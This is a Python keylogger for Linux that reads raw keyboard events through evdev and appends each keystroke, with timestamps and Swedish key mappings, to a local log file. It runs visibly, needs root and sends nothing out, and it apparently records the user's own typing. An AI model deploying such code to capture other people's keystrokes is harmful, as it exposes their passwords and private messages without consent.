import evdev
from evdev import InputDevice, categorize, ecodes
from datetime import datetime
import os


DEVICE_PATH = '/dev/input/event2' 
LOG_FILE = '/home/user/my_history.txt'


replace_map = {
    'KEY_SPACE': ' ',
    'KEY_ENTER': '\n[ENTER]\n',
    'KEY_BACKSPACE': '[BACKSPACE]',
    'KEY_TAB': '\t',
    'KEY_LEFTBRACE': 'å',
    'KEY_APOSTROPHE': 'ä',
    'KEY_SEMICOLON': 'ö',
    'KEY_LEFTSHIFT': '[SHIFT]',
    'KEY_RIGHTSHIFT': '[SHIFT]',
    'KEY_CAPSLOCK': '[CAPS]'
}

def main():
    try:
        dev = InputDevice(DEVICE_PATH)
    except PermissionError:
        print("Wrong : you need to be 'sudo'!")
        return
    except FileNotFoundError:
        print(f"Could not find {DEVICE_PATH}")
        return

    print(f"Loggning started on {dev.name}. Save to {LOG_FILE}")

    with open(LOG_FILE, "a") as f:
        
        f.write(f"\n\n--- Ny session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")

        last_time = 0

        for event in dev.read_loop():
            if event.type == ecodes.EV_KEY:
                key_event = categorize(event)

                
                if key_event.keystate == key_event.key_down:
                    current_time = event.timestamp()
                    key_name = key_event.keycode

                    
                    if current_time - last_time > 5:
                        timestamp = datetime.now().strftime('\n[%H:%M:%S] -> ')
                        f.write(timestamp)

                    last_time = current_time

                    
                    if isinstance(key_name, str):
                        clean_name = key_name.replace('KEY_', '')
                        final_char = replace_map.get(key_name, clean_name.lower())

                        f.write(final_char)
                        f.flush() 

if __name__ == "__main__":
    main()